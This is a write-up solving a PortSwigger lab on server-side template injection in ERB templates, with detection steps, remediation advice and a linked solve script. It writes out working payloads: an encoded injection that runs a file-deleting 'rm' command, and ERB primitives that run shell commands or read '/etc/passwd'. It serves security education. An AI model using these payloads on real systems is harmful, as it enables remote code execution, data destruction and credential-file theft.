# Lab 1: Basic Server-Side Template Injection

**Category:** Server-Side Template Injection (SSTI)
**Difficulty:** Apprentice
**Lab link:** [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

## Overview

The app passes a `message` URL parameter directly into an ERB (Embedded Ruby) template string for rendering. ERB evaluates `<%= ... %>` blocks as Ruby code — injecting such a block causes the server to execute arbitrary Ruby, leading to RCE. The goal is to delete `/home/carlos/morale.txt`.

## Key Concepts

- **SSTI root cause:** user input concatenated into the template string itself, not passed as a data variable. `render("<p>#{user_input}</p>")` vs `render("<p>{{ message }}</p>", message=user_input)` — the first is vulnerable, the second is not.
- **ERB syntax:** `<%= expression %>` evaluates and outputs the result. ` <% code %>` executes without output. The `system()` / backtick call runs OS commands.
- **Detection → Identification → Exploitation:** test math expressions first to confirm evaluation, then use engine-specific RCE primitives.

## Solution

### Step 1 — Detect SSTI

Navigate to a product page with no stock. The URL contains:
```
?message=Unfortunately+this+product+is+out+of+stock
```

Inject an ERB math probe:
```
?message=<%25%3d+7*7+%25>
```
(URL-encoded form of `<%= 7*7 %>`)

If `49` appears in the response body → ERB SSTI confirmed.

### Step 2 — Execute OS command

Delete the target file:
```
?message=<%25%3d+system('rm+/home/carlos/morale.txt')+%25>
```

The server executes `system('rm /home/carlos/morale.txt')`. Lab solved.

## ERB RCE Primitives

```ruby
<%= system('id') %>              # run command, output goes to stdout (not response)
<%= `id` %>                      # backtick: runs command, returns output inline
<%= IO.popen('id').read %>       # explicit pipe, output in response
<%= File.read('/etc/passwd') %>  # file read
```

For the lab, `system('rm ...')` works. To see output, use backticks or `IO.popen`.

## URL Encoding Reference

| Character | Encoded |
|---|---|
| `<` | `%3c` |
| `>` | `%3e` |
| `%` | `%25` |
| `=` | `%3d` |
| space | `+` or `%20` |

Full payload URL-encoded: `%3c%25%3d+system('rm+/home/carlos/morale.txt')+%25%3e`

## Remediation

- Pass user input as **template context variables**, never as part of the template string.
  ```ruby
  # Vulnerable
  ERB.new("Hello #{name}").result
  # Safe
  ERB.new("Hello <%= name %>").result(binding)  # name is a variable, not injected
  ```
- Use logic-less templates where dynamic code execution is not required.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/server-side-template-injection/lab-01-basic-erb/solve.py)

Sends the ERB RCE payload via the `message` URL parameter to delete `/home/carlos/morale.txt`.

## Key Takeaways

- SSTI is injection into the template *string*, not into the rendered output.
- ERB's `<%= %>` and backticks provide immediate RCE with no sandbox.
- URL-encode template syntax carefully — `%` must be `%25` to survive URL parsing.
- Detection: inject `<%= 7*7 %>` → look for `49` in response.
